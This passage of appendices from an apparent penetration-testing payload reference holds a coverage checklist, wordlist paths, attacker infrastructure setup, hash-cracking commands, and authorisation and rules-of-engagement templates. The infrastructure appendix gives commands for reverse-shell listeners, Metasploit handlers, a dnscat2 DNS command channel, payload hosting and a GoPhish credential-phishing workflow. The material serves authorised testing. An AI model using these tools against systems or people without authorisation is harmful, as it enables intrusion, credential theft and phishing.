| **Web Application Testing** | Payload Reference Book | §1–10, §19 — all web attack categories |
| **Authentication Testing** | Payload Reference Book | §8 — Auth, JWT, Session |
| **Network Service Attacks** | Payload Reference Book | §12, §14 — Network and SMB |
| **Active Directory Testing** | Payload Reference Book | §13 — Full AD attack chain |
| **Privilege Escalation (Linux)** | Payload Reference Book | §15 — Linux PrivEsc |
| **Privilege Escalation (Windows)** | Payload Reference Book | §16 — Windows PrivEsc |
| **Post-Exploitation** | Payload Reference Book | §13–16 — Lateral movement, persistence |
| **Social Engineering Testing** | SE Handbook + Payload Reference Book | SE Handbook full; Payload Book §17 |
| **Wireless Testing** | Payload Reference Book | §18 — Wireless |
| **Reporting** | Penetration Testing Playbook v3 | Playbook §9 — Report writing |
| **Remediation Recommendations** | Remediation Handbook | Per vulnerability class |
| **Remediation Verification (Retest)** | Payload Reference Book + Remediation Handbook | Relevant payload section + RH verification steps |
| **Full Campaign Orchestration** | Campaign Guide | Campaign Guide §1–8 — end-to-end engagement management |

---

# APPENDIX C: ENGAGEMENT CHECKLIST (PAYLOAD BOOK PERSPECTIVE)

Use this checklist to track testing coverage across an engagement. This is not a full methodology checklist — the Playbook covers that. This is a payload-layer confirmation that each attack category has been attempted against in-scope targets.

Mark each row: **Tested** (attempt made), **Not Tested** (out of scope or not applicable), or **Confirmed Vulnerable** (finding to document).

| # | Category | Section | Status | Result / Notes |
|---|---------|---------|--------|---------------|
| 1 | SQL Injection | §1 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 1.1 | — Error-based SQLi | §1.1 | | |
| 1.2 | — Blind Boolean SQLi | §1.2 | | |
| 1.3 | — Time-based Blind SQLi | §1.3 | | |
| 1.4 | — UNION-based SQLi | §1.4 | | |
| 1.5 | — Out-of-Band SQLi | §1.5 | | |
| 2 | Cross-Site Scripting (XSS) | §2 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 2.1 | — Reflected XSS | §2.1 | | |
| 2.2 | — Stored XSS | §2.2 | | |
| 2.3 | — DOM-based XSS | §2.3 | | |
| 3 | Server-Side Template Injection (SSTI) | §3 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 4 | XML External Entity (XXE) | §4 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 5 | Server-Side Request Forgery (SSRF) | §5 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 6 | Path Traversal / LFI | §6 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 7 | Command Injection (CMDi) | §7 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 8 | Authentication / JWT / Session | §8 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 8.1 | — JWT algorithm confusion | §8.1–8.2 | | |
| 8.2 | — JWT weak secret | §8.3 | | |
| 8.3 | — Session fixation / hijacking | §8.4 | | |
| 8.4 | — Account lockout policy assessed | §8.5 | | |
| 9 | Insecure Deserialization | §9 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 10 | HTTP Smuggling / CORS | §10 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 11 | Password Attacks | §11 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 11.1 | — Password spraying (web + AD) | §11.1 | | |
| 11.2 | — Credential stuffing | §11.2 | | |
| 11.3 | — Captured hash cracking | §11.3 | | |
| 12 | Network Enumeration | §12 | [ ] Tested / [ ] Not Tested / [ ] Complete | |
| 12.1 | — Full port scan completed | §12.1 | | |
| 12.2 | — Service version enumeration done | §12.2 | | |
| 12.3 | — Default credentials checked | §12.3 | | |
| 13 | Active Directory | §13 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 13.1 | — AD enumeration (BloodHound) | §13.1 | | |
| 13.2 | — Kerberoasting attempted | §13.2 | | |
| 13.3 | — AS-REP Roasting attempted | §13.3 | | |
| 13.4 | — NTLM relay assessed | §13.4 | | |
| 13.5 | — Pass-the-Hash attempted | §13.5 | | |
| 13.6 | — DCSync rights assessed | §13.7 | | |
| 13.7 | — ADCS templates enumerated | §13.10 | | |
| 14 | SMB / Windows Lateral Movement | §14 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 14.1 | — SMB null sessions tested | §14.1 | | |
| 14.2 | — SMB signing status checked | §14.2 | | |
| 14.3 | — Writable shares identified | §14.3 | | |
| 15 | Linux Privilege Escalation | §15 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 15.1 | — SUID/SGID binaries checked | §15.1 | | |
| 15.2 | — Sudo rights assessed | §15.2 | | |
| 15.3 | — Cron jobs checked | §15.3 | | |
| 15.4 | — Writable paths in PATH assessed | §15.4 | | |
| 16 | Windows Privilege Escalation | §16 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 16.1 | — Unquoted service paths | §16.1 | | |
| 16.2 | — Weak service permissions | §16.2 | | |
| 16.3 | — Token impersonation (SeImpersonate) | §16.3 | | |
| 16.4 | — AlwaysInstallElevated checked | §16.4 | | |
| 17 | Social Engineering (if in scope) | §17 | [ ] In Scope / [ ] Out of Scope | |
| 17.1 | — Phishing campaign | §17.1 | | |
| 17.2 | — Vishing attempted | §17.2 | | |
| 17.3 | — USB drop deployed | §17.3 | | |
| 17.4 | — Physical access attempted | SE Handbook §6 | | |
| 18 | Wireless (if in scope) | §18 | [ ] In Scope / [ ] Out of Scope | |
| 18.1 | — WPA2 handshake captured | §18.1 | | |
| 18.2 | — PMKID attack attempted | §18.2 | | |
| 18.3 | — Rogue AP assessed | §18.3 | | |
| 19 | Web Miscellaneous | §19 | [ ] Tested / [ ] Not Tested / [ ] Vuln | |
| 19.1 | — Open redirects | §19.1 | | |
| 19.2 | — GraphQL introspection exposed | §19.2 | | |
| 19.3 | — IDOR/BOLA | §19.4 | | |
| 19.4 | — WebSocket attacks | §19.5 | | |

**Tester:** ______________________ **Date:** ______________ **Engagement Ref:** ______________

---

# APPENDIX D: WORDLISTS AND DICTIONARIES REFERENCE

## Password Lists

### rockyou.txt

The de facto standard password wordlist for offline cracking.

```bash
# Location on Kali
/usr/share/wordlists/rockyou.txt
# If compressed:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Size: ~133MB, ~14.3 million entries
wc -l /usr/share/wordlists/rockyou.txt
# 14344391 lines
```

### SecLists Credential Lists

SecLists is the most comprehensive collection of wordlists for security testing.

```bash
# Install SecLists
sudo apt install -y seclists
# Location: /usr/share/seclists/

# Alternatively:
git clone https://github.com/danielmiessler/SecLists /opt/seclists

# Key password lists:
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
```

### Hashcat Wordlist Packs

```bash
# Hashcat wiki maintains large curated packs
# https://hashcat.net/wiki/doku.php?id=hashcat

# CrackStation wordlist (1.5B words, 15GB)
wget https://crackstation.net/files/crackstation.txt.gz

# Weakpass (multiple large packs)
# https://weakpass.com/wordlist
```

---

## Web Fuzzing Lists

### Directory and File Discovery

```bash
# Common directories (fast, start here)
/usr/share/seclists/Discovery/Web-Content/common.txt                    # ~4,700 entries
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt # ~220,000 entries
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt    # ~1.27M entries

# Dirsearch built-in wordlist
/usr/lib/python3/dist-packages/dirsearch/db/dicc.txt

# raft wordlists (varied content types)
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
```

### API Endpoint Discovery

```bash
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/api/objects.txt
/usr/share/seclists/Discovery/Web-Content/swagger.txt

# Common API paths to manually check:
# /api/ /api/v1/ /api/v2/ /rest/ /graphql /swagger /swagger-ui.html
# /api-docs /openapi.json /.well-known/ /actuator /actuator/env /actuator/health
```

### File Extensions

```bash
/usr/share/seclists/Discovery/Web-Content/web-extensions.txt

# Manual high-value extensions to fuzz:
# .bak .old .orig .backup .swp .tmp .log .conf .config .xml .json .env .git
```

### Backup File Patterns

```bash
/usr/share/seclists/Discovery/Web-Content/backup-files.txt

# ffuf example — fuzz for backup files
ffuf -u http://[TARGET_IP]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/backup-files.txt -mc 200
```

---

## Subdomain and DNS Lists

```bash
# SecLists DNS subdomain lists
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

# Usage with gobuster
gobuster dns -d [DOMAIN] -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r [DNS_SERVER]

# Usage with ffuf (virtual host fuzzing)
ffuf -u http://[TARGET_IP]/ -H "Host: FUZZ.[DOMAIN]" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200
```

---

## Username Lists

```bash
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Windows/AD specific usernames
/usr/share/seclists/Usernames/cirt-default-usernames.txt

# Generate username list from full names (e.g., from LinkedIn OSINT)
# Pattern: firstname.lastname, f.lastname, flastname
# Tool: namemash.py (commonly used in pentest engagements)
python3 namemash.py names.txt > usernames.txt
```

---

## Default Credentials

```bash
/usr/share/seclists/Passwords/Default-Credentials/default-passwords.csv
/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt
/usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt

# Online reference: https://cirt.net/passwords
# Search by vendor/product for default credentials
```

---

## Custom Wordlist Generation

### CeWL — Website Spider

CeWL crawls a target website and generates a custom wordlist from the text found. Useful for generating organisation-specific password candidates.

```bash
# Install
sudo apt install -y cewl

# Basic usage
cewl http://[TARGET_URL] -d 3 -m 8 -w custom_wordlist.txt
# -d depth, -m minimum word length, -w output file

# Include email addresses
cewl http://[TARGET_URL] -d 2 -m 6 --email -w wordlist_with_emails.txt

# Verify output
wc -l custom_wordlist.txt
```

### Crunch — Pattern-Based Generation

```bash
# Install
sudo apt install -y crunch

# Generate all 8-character passwords with lowercase + numbers
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o charset_8.txt

# Generate passwords matching a pattern (@ = lowercase, , = uppercase, % = number, ^ = symbol)
crunch 10 10 -t [COMPANY]%%% -o company_pattern.txt

# Season + year pattern (common corporate password policy)
crunch 10 10 -t Spring%%%% -o spring_passwords.txt
```

### Hashcat Masks

```bash
# Hashcat mask charsets:
# ?l = lowercase  ?u = uppercase  ?d = digit  ?s = special  ?a = all printable

# 8-char password: uppercase + 6 lowercase + digit (common pattern)
hashcat -m 1000 [HASHFILE] -a 3 ?u?l?l?l?l?l?l?d

# 9-char with year suffix
hashcat -m 1000 [HASHFILE] -a 3 ?u?l?l?l?l2026

# Hybrid attack: wordlist + mask (word followed by 2 digits)
hashcat -m 1000 [HASHFILE] -a 6 [WORDLIST] ?d?d
```

---

## Rule Files

Rules transform wordlist entries during cracking (capitalise, append numbers, substitute characters, etc.). Rules dramatically increase cracking coverage without requiring larger wordlists.

```bash
# Hashcat built-in rules location
ls /usr/share/hashcat/rules/

# Key rule files:
/usr/share/hashcat/rules/best64.rule          # 64 best rules — fast, high coverage
/usr/share/hashcat/rules/rockyou-30000.rule   # 30,000 rules derived from rockyou analysis
/usr/share/hashcat/rules/dive.rule            # ~99,000 rules — comprehensive
/usr/share/hashcat/rules/d3ad0ne.rule         # Popular all-purpose ruleset

# OneRuleToRuleThemAll — community-maintained mega ruleset
git clone https://github.com/NotSoSecure/password_cracking_rules /opt/password_rules
# File: /opt/password_rules/OneRuleToRuleThemAll.rule

# Usage
hashcat -m 1000 [HASHFILE] [WORDLIST] -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 [HASHFILE] [WORDLIST] -r /opt/password_rules/OneRuleToRuleThemAll.rule
```

---

# APPENDIX E: ATTACKER INFRASTRUCTURE QUICK SETUP

Set up this infrastructure before beginning an engagement. Having these components ready avoids delays when a vulnerability window opens during testing.

---

## Attack Box

**Recommended: Kali Linux 2024.x or later**

```bash
# VM configuration (minimum)
# RAM: 4GB (8GB recommended for BloodHound + Neo4j + Burp concurrently)
# Disk: 80GB (allow space for captures, wordlists, tool output)
# Network: Bridged (for LAN testing) or NAT (for internet-facing tests)

# Verify network interface
ip a
ip route

# Set a static IP if needed (replace values)
sudo ip addr add [YOUR_IP]/[CIDR] dev eth0
sudo ip route add default via [GATEWAY_IP]
```

---

## Basic Listener

```bash
# Raw netcat listener (simple reverse shell catch)
rlwrap nc -lvnp 4444

# rlwrap gives readline history — tab completion in the shell
sudo apt install -y rlwrap

# Stable listener for multiple connections
while true; do rlwrap nc -lvnp 4444; done
```

---

## Metasploit Multi/Handler (Staged Payloads)

```bash
msfconsole -q -x "
  use exploit/multi/handler;
  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
  set LHOST [YOUR_IP];
  set LPORT 4444;
  set ExitOnSession false;
  run -j
"

# For Linux staged payload
msfconsole -q -x "
  use exploit/multi/handler;
  set PAYLOAD linux/x64/meterpreter/reverse_tcp;
  set LHOST [YOUR_IP];
  set LPORT 4444;
  run -j
"
```

---

## HTTP Server for Payload Delivery

```bash
# Python simple HTTP server (serves current directory)
python3 -m http.server 8080

# Specific directory
python3 -m http.server 8080 --directory /opt/payloads/

# With HTTPS (self-signed)
openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes -subj "/CN=localhost"
python3 -c "
import ssl, http.server
httpd = http.server.HTTPServer(('0.0.0.0', 8443), http.server.SimpleHTTPRequestHandler)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain('server.crt', 'server.key')
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
httpd.serve_forever()
"
```

---

## Out-of-Band Callback Infrastructure

Out-of-band callbacks confirm blind vulnerabilities (Blind SQLi, Blind CMDi, Blind SSRF, Blind XXE) where no response is returned to the attacker.

### Burp Collaborator (Burp Pro)

```
# In Burp Suite Pro:
# Burp menu → Burp Collaborator client → Copy to clipboard
# Use the generated hostname as [CALLBACK_HOST] in payloads
# Monitor the Collaborator client panel for DNS/HTTP/SMTP interactions
```

### interactsh (Self-Hosted, Free)

```bash
# Install client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Start client (uses projectdiscovery hosted server)
interactsh-client -server interactsh.com -n 10
# Provides 10 unique subdomains for callbacks

# Self-hosted server (for restricted engagements)
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-server@latest
interactsh-server -domain [YOUR_DOMAIN] -ip [YOUR_VPS_IP]
```

### Canarytokens (Quick Web-Based)

```bash
# No install required — use the web service
# https://canarytokens.org/generate
# Generates unique URL/DNS tokens — notifies you via email when triggered
# Good for quick SSRF/blind injection checks in low-risk engagements
```

---

## DNS Server for Exfiltration Testing

```bash
# dnscat2 — encrypted DNS C2 channel (also useful for confirming DNS callbacks)
git clone https://github.com/iagox86/dnscat2 /opt/dnscat2

# Server (on VPS with public DNS):
cd /opt/dnscat2/server && gem install bundler && bundle install
ruby dnscat2.rb [YOUR_DOMAIN] --dns "host=0.0.0.0,port=53,domain=[YOUR_DOMAIN]" --no-cache

# Client (on target):
./dnscat --secret=[SECRET] [YOUR_DOMAIN]

# interactsh also handles DNS callbacks (see above)
```

---

## SMTP Server for Phishing Infrastructure

```bash
# GoPhish — phishing campaign management platform
# Install
wget https://github.com/gophish/gophish/releases/latest/download/gophish-[VERSION]-linux-64bit.zip
unzip gophish-[VERSION]-linux-64bit.zip
chmod +x gophish
./gophish
# Admin UI: https://localhost:3333 (default creds: admin/gophish — change immediately)

# Postfix MTA (for sending mail from your domain)
sudo apt install -y postfix
# Configure as Internet Site during setup wizard
# Set myorigin and mydomain to your sending domain
# Ensure SPF, DKIM, DMARC DNS records are configured (test at mail-tester.com)

# Key GoPhish workflow:
# 1. Create Sending Profile (SMTP relay or Postfix)
# 2. Create Landing Page (clone target's login page)
# 3. Create Email Template (phishing lure)
# 4. Create Users & Groups (import target employees)
# 5. Launch Campaign
# 6. Monitor dashboard for opens, clicks, credentials submitted
```

---

## VPN / Redirector: SSH Tunnel Pattern

When testing requires anonymising traffic or routing through a clean IP:

```bash
# Dynamic SOCKS proxy through a VPS
ssh -D 1080 -N -f user@[VPS_IP]

# Configure proxychains to use SOCKS5 127.0.0.1:1080
sudo nano /etc/proxychains4.conf
# Add: socks5 127.0.0.1 1080

# Route tool traffic through tunnel
proxychains nmap -sT -Pn [TARGET_IP]
proxychains sqlmap -u "[URL]" --batch

# Port forward (expose local tool on VPS public port — e.g., catch reverse shell via VPS)
ssh -R [VPS_PORT]:localhost:4444 user@[VPS_IP]
# Payload connects to [VPS_IP]:[VPS_PORT] → forwarded to your local listener on 4444
```

---

# APPENDIX F: HASH REFERENCE

## Hash Identification and Cracking

```bash
# Identify an unknown hash type
hashcat --identify hashfile.txt

# Alternatively
hash-identifier
# or
python3 -c "import hashid; h = hashid.HashID(); [print(i) for i in h.identifyHash('[HASH_STRING]')]"

# Install hash-identifier
pip3 install hashid
```

---

## Hash Type Reference Table

| Hash Type | Example (truncated) | Length (chars) | Hashcat Mode (-m) | How to Identify | Common Source |
|-----------|-------------------|----------------|-------------------|----------------|---------------|
| MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | 32 | 0 | 32 hex chars, no prefix | Web apps (legacy), file integrity checks |
| SHA1 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | 40 | 100 | 40 hex chars, no prefix | Git commits, older web apps |
| SHA256 | `5e884898da28...` | 64 | 1400 | 64 hex chars | Modern web apps, certificates |
| SHA512 | `b109f3bbbc24...` | 128 | 1700 | 128 hex chars | Modern apps, TLS |
| NTLM | `8846f7eaee8fb117ad06bdd830b7586c` | 32 | 1000 | 32 hex, from Windows SAM/NTDS | Windows SAM database, NTDS.dit, secretsdump |
| NTLMv1 | `username::domain:challenge:resp` | Variable | 5500 | Contains `::` separators, challenge/response format | Responder, PCAP capture |
| NTLMv2 | `username::domain:challenge:hmac` | Variable | 5600 | Contains `::`, longer than v1 | Responder, PCAP — most modern Windows |
| Net-NTLMv1 | Same as NTLMv1 | Variable | 5500 | Captured during authentication challenge | Responder, network capture |
| Net-NTLMv2 | Same as NTLMv2 | Variable | 5600 | As above, most common modern capture | Responder, Inveigh |
| bcrypt | `$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy` | 60 | 3200 | Starts with `$2a$`, `$2b$`, `$2y$` | Modern web apps (PHP, Node.js) |
| scrypt | `$scrypt$ln=15,r=8,p=1$...` | Variable | 8900 | Starts with `$scrypt$` | Some modern apps |
| Argon2 | `$argon2id$v=19$m=65536...` | Variable | None (not in hashcat) | Starts with `$argon2` | Newer applications — GPU cracking impractical |
| SHA512crypt ($6$) | `$6$salt$hash` | Variable | 1800 | Starts with `$6$` | Linux /etc/shadow |
| SHA256crypt ($5$) | `$5$salt$hash` | Variable | 7400 | Starts with `$5$` | Linux /etc/shadow |
| MD5crypt ($1$) | `$1$salt$hash` | Variable | 500 | Starts with `$1$` | Older Linux /etc/shadow, some network devices |
| DES-crypt | `aB1Cd2Ef3Gh4Ij` | 13 | 1500 | 13 chars, alphanumeric+./  | Very old Linux, some legacy Unix |
| Kerberos TGS-REP etype 23 | `$krb5tgs$23$*user$...` | Variable | 13100 | Starts with `$krb5tgs$23$` | Kerberoasting (GetUserSPNs.py, Rubeus) |
| Kerberos AS-REP | `$krb5asrep$23$user@...` | Variable | 18200 | Starts with `$krb5asrep$` | AS-REP roasting (GetNPUsers.py) |
| WPA2 (PMKID) | `[pmkid]*[ap_mac]*[client_mac]*[ssid_hex]` | Variable | 22000 | hcxtools format | hcxdumptool capture |
| WPA2 (EAPOL Handshake) | Same format after hcxpcapngtool conversion | Variable | 22000 | Converted via hcxpcapngtool | airodump-ng + aireplay-ng |
| MySQL 3.2.3 | `606717496665bcba` | 16 | 200 | Short hex, no prefix | Old MySQL (<4.1) |
| MySQL4.1/MySQL41 | `*94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29` | 41 | 300 | Starts with `*`, 41 chars | MySQL 4.1+ mysql.user table |
| MSSQL 2000 | `0x0100...` | Variable | 131 | Starts with `0x0100` | SQL Server 2000 master..sysxlogins |
| MSSQL 2005 | `0x0100...` | Variable | 132 | Starts with `0x0100` (same prefix, different internals) | SQL Server 2005-2008 sys.sql_logins |
| MSSQL 2012+ | `0x0200...` | Variable | 1731 | Starts with `0x0200` | SQL Server 2012+ sys.sql_logins |
| Oracle H (11g) | `S:hash;T:hash` | Variable | 112 | Contains `S:` prefix | Oracle 11g DBA_USERS |
| Oracle T (12c) | `H:hash` | Variable | 12300 | Oracle 12c format | Oracle 12c DBA_USERS |

---

## Common Hash Cracking One-Liners

```bash
# NTLM (from SAM/NTDS)
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLMv2 (from Responder)
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Kerberoasting TGS (etype 23)
hashcat -m 13100 tgs_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# AS-REP Roasting
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# bcrypt (slow — use targeted wordlist + rules)
hashcat -m 3200 bcrypt_hashes.txt custom_wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# SHA512crypt (Linux shadow)
hashcat -m 1800 shadow_hashes.txt /usr/share/wordlists/rockyou.txt

# WPA2
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

# MD5 (legacy web app passwords)
hashcat -m 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# SHA1
hashcat -m 100 sha1_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

# APPENDIX G: LEGAL AND AUTHORISATION TEMPLATES

## Penetration Test Authorisation Letter

This letter must be completed and signed by an authorised representative of the client organisation before any testing begins. "Authorised representative" means an individual with the authority to bind the organisation — typically a C-level officer, General Counsel, or CISO.

---

```
PENETRATION TEST AUTHORISATION LETTER

Date: ___________________________

Client Organisation: ___________________________
Client Address: ___________________________
Authorised Representative Name: ___________________________
Authorised Representative Title: ___________________________
Authorised Representative Email: ___________________________

Testing Provider Organisation: ___________________________
Lead Tester Name(s): ___________________________
Lead Tester Email: ___________________________

1. AUTHORISATION

[CLIENT ORGANISATION] hereby authorises [TESTING PROVIDER] and the
named testers to conduct penetration testing activities against the
systems and infrastructure described in Section 3 (Systems In Scope),
during the test window described in Section 2, using the techniques
listed in the agreed Rules of Engagement document.

This authorisation constitutes written permission for the purposes of
the Criminal Code Act 1995 (Cth), the Computer Fraud and Abuse Act
18 U.S.C. § 1030, and applicable local laws in the jurisdiction(s)
where in-scope systems are hosted or operated.

2. TEST WINDOW

Authorised Start Date and Time: ___________________________
Authorised End Date and Time: ___________________________
Time Zone: ___________________________

Out-of-hours testing permitted: Yes / No
If yes, authorised hours: ___________________________

3. SYSTEMS IN SCOPE

The following systems, IP addresses, domains, and/or applications
are authorised for testing:

[LIST ALL IN-SCOPE SYSTEMS, IP RANGES, DOMAINS, AND APPLICATIONS]

Example:
- Web application: https://app.example.com
- IP range: 10.10.10.0/24 (internal network segment A)
- Domain: CORP.LOCAL (Active Directory)
- Cloud: AWS account ID [ACCOUNT_ID] — regions us-east-1, ap-southeast-2

4. SYSTEMS EXPLICITLY OUT OF SCOPE

The following systems MUST NOT be tested under any circumstances:

[LIST ALL OUT-OF-SCOPE SYSTEMS]

Example:
- Production database server: db-prod-01.example.com (10.10.10.50)
- Third-party payment processor: payments.stripe.com (not owned by client)
- Life-safety systems (if applicable)

5. PERMITTED TECHNIQUES

The following testing techniques are authorised:

[ ] Network port scanning and service enumeration
[ ] Web application vulnerability testing (OWASP Top 10)
[ ] Authentication and session testing
[ ] Password spraying (max [N] attempts per account — confirm lockout threshold)
[ ] Social engineering: email phishing
[ ] Social engineering: vishing
[ ] Physical access testing
[ ] Wireless network testing
[ ] Active Directory / internal network testing
[ ] Denial of Service testing (specify systems: _______)

6. EMERGENCY CONTACT

In the event of a critical finding, service disruption, or discovery
of active third-party compromise, the tester will contact:

Client Emergency Contact Name: ___________________________
Client Emergency Contact Phone: ___________________________
Client Emergency Contact Email: ___________________________
Available: 24/7 / Business hours only

Testing Provider Emergency Contact: ___________________________
Phone: ___________________________

7. DATA HANDLING

All captured credentials, hashes, PII, and other sensitive data
obtained during testing shall be:
- Stored encrypted on the tester's systems during the engagement
- Included in the final report only as necessary to demonstrate findings
- Permanently destroyed within [30] days of final report delivery
- Not shared with any third party without written client consent

8. AUTHORISATION SIGNATURE

By signing below, the undersigned confirms they have authority to
grant this authorisation on behalf of [CLIENT ORGANISATION].

Client Authorised Representative:

Name: ___________________________
Title: ___________________________
Signature: ___________________________
Date: ___________________________

Testing Provider Acceptance:

Name: ___________________________
Title: ___________________________
Signature: ___________________________
Date: ___________________________
```

---

## Rules of Engagement Template

```
RULES OF ENGAGEMENT
Penetration Test: [ENGAGEMENT REFERENCE]
Client: [CLIENT ORGANISATION]
Testing Provider: [TESTING PROVIDER]
Date Agreed: ___________________________

1. TEST TYPE

[ ] Black Box — No prior knowledge of systems provided to testers
[ ] Grey Box  — Limited knowledge provided (credentials, network diagrams, or application access)
[ ] White Box — Full knowledge provided (source code, architecture, credentials)

2. TESTING APPROACH

[ ] External — Testing from outside the client network (internet-facing assets only)
[ ] Internal — Testing from inside the client network (requires on-site or VPN access)
[ ] Both

3. NOTIFICATION REQUIREMENTS

[ ] Client will be notified before testing begins each day
[ ] Client will not be notified (stealth test — Blue Team is not informed)
[ ] Notify client immediately if testing causes unintended service disruption
[ ] Notify client immediately if evidence of active third-party compromise is found
[ ] Findings with CVSS Critical severity to be notified within [4] hours of discovery

4. PERMITTED TECHNIQUES

The following are permitted within the agreed test window and scope:

[ ] Network scanning and enumeration
[ ] Web application testing (manual and automated)
[ ] Password spraying — max [N] attempts per account per [timeframe]
[ ] Hash cracking (offline, using captured material only)
[ ] Exploitation of discovered vulnerabilities (limited to proof-of-concept)
[ ] Post-exploitation: local privilege escalation
[ ] Post-exploitation: lateral movement within scope
[ ] Post-exploitation: data exfiltration simulation (non-PII, agreed file only)
[ ] Social engineering — email only
[ ] Social engineering — phone (vishing)
[ ] Physical access testing — specify areas: ___________________________
[ ] Wireless testing

5. PROHIBITED TECHNIQUES

The following are NOT permitted under any circumstances:

[X] Denial of Service (DoS) or Distributed DoS attacks
[X] Destruction or modification of production data
[X] Exfiltration of real PII, financial data, health records, or trade secrets
    (proof-of-concept only — access confirmed, no actual data removed)
[X] Installing persistent backdoors without explicit client authorisation
[X] Testing systems explicitly listed as out of scope
[X] Targeting systems owned by third parties not party to this agreement
[X] Social engineering of client employees outside agreed parameters

6. ACCOUNT LOCKOUT SAFETY

Before password spraying:
- Client to confirm: account lockout threshold: [N] failed attempts
- Client to confirm: lockout duration: ___________________________
- Tester will use no more than [N-2] attempts per account per [lockout reset window]
- Exception: specific test accounts designated by client may be exempt

7. INCIDENT NOTIFICATION PROCESS

If testing causes unintended service disruption:
1. Tester stops the activity immediately
2. Tester calls client emergency contact (see Authorisation Letter)
3. Tester documents timestamp, action taken, and observed impact
4. Testing does not resume until client confirms it is safe to do so
5. Incident is documented in the final report

8. FINDINGS HANDLING

- All findings to be reported in the final written report
- Draft report delivered to client for factual accuracy review before final publication
- Final report delivered within [10] business days of test completion
- Report to be treated as CONFIDENTIAL — distribution restricted to agreed parties
- Sensitive material (hashes, credentials, proof-of-concept code) in a separate appendix
- All captured data destroyed within [30] days of final report delivery

9. SIGNATURES

Client:
Name: ___________________________
Title: ___________________________
Signature: ___________________________
Date: ___________________________

Testing Provider:
Name: ___________________________
Title: ___________________________
Signature: ___________________________
Date: ___________________________
```

---

## Findings Severity Matrix

Use this matrix consistently across all reports to ensure findings are rated using objective criteria.

| Severity | Definition | Example Vulnerabilities | Remediation SLA | CVSS v3 Range |
|---------|-----------|------------------------|----------------|---------------|
| **Critical** | Unauthenticated remote code execution; domain or environment-wide compromise achievable by an unauthenticated attacker; direct access to all data; complete loss of confidentiality, integrity, or availability | Unauthenticated RCE, SQLi with OS command execution, DCSync rights for non-admin accounts, Golden Ticket attack, unpatched RCE CVE (e.g. Log4Shell, EternalBlue) | 24–48 hours (emergency patch or compensating control) | 9.0–10.0 |
| **High** | Significant vulnerability requiring authentication or limited interaction; access to sensitive data, significant privilege escalation, or full application compromise; exploitable with a reasonable attacker skill level | Authenticated SQLi with data exfiltration, Kerberoasting with crackable hashes, Pass-the-Hash to admin, stored XSS with admin session theft, SSRF to cloud metadata, ADCS ESC1/ESC8 | 2 weeks | 7.0–8.9 |
